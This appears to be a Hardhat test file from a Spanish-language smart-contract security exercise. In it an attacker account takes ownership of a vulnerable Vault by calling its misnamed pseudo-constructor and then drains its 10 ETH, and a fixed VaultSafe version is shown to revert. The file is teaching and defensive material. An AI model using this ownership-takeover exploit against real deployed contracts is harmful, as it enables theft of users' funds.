const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 1", function () {

  let deployer, atacante;

  beforeEach(async function () {

    [deployer, atacante] = await ethers.getSigners();

    // Deployamos el contrato vulnerable con la cuenta "deployer"
    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.contrato = await Vault.deploy();

    // Deployer deposita 10 ETH
    await this.contrato.deposit({ value: ethers.utils.parseEther('10') });
    let balance = await ethers.provider.getBalance(this.contrato.address);
    expect(balance).to.eq(ethers.utils.parseEther('10'));
    console.log(
      `El balance inicial del contrato es: ${balance}`
    );
  });

  it("Ataque", async function () {
    // Version vieja de solidity, el "constructor" no es tal, es una funcion abierta.
    let _initial_balance = await ethers.provider.getBalance(atacante.address);
    console.log("Initial Balance " + _initial_balance);
    await this.contrato.connect(atacante).Vaull();
    await this.contrato.connect(atacante).withdrawAllDeposits()
    let _final_balance = await ethers.provider.getBalance(atacante.address);
    console.log("Final Balance " + _final_balance);
    expect(_initial_balance < _final_balance);
    expect(await ethers.provider.getBalance(this.contrato.address)).to.eq(ethers.utils.parseEther('0'));
  });
});

describe("Ejercicio 1 - Safe", function () {

  let deployer, atacante;

  beforeEach(async function () {

    [deployer, atacante] = await ethers.getSigners();

    // Deployamos el contrato vulnerable con la cuenta "deployer"
    const VaultSafe = await ethers.getContractFactory("VaultSafe", deployer);
    this.contrato = await VaultSafe.deploy();

    // Deployer deposita 10 ETH
    await this.contrato.deposit({ value: ethers.utils.parseEther('10') });
    let balance = await ethers.provider.getBalance(this.contrato.address);
    expect(balance).to.eq(ethers.utils.parseEther('10'));
    console.log(
      `El balance inicial del contrato es: ${balance}`
    );
  });

  it("Ataque Fallido", async function () {
    // Version vieja de solidity, el "constructor" no es tal, es una funcion abierta.
    expect(this.contrato.connect(atacante).withdrawAllDeposits()).to.be.revertedWith("Not owner");
  });
});
